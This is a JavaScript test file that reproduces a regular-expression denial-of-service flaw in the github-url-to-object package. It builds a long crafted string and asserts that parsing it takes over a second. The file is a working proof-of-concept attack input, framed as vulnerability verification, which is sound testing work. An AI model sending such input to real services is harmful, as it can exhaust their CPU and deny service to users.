test("ReDos in github-url-to-object", () => {
  const measureTime = require("../utils").measureTime;
  const gh = require("github-url-to-object");
  let prefix = "a/a";
  let pump = "a";
  let suffix = "a/";
  let attackString = prefix;
  for (let i = 0; i < 25000; i++) {
    attackString += pump;
  }
  attackString += suffix;
  let t = measureTime(function () {
    gh(attackString);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
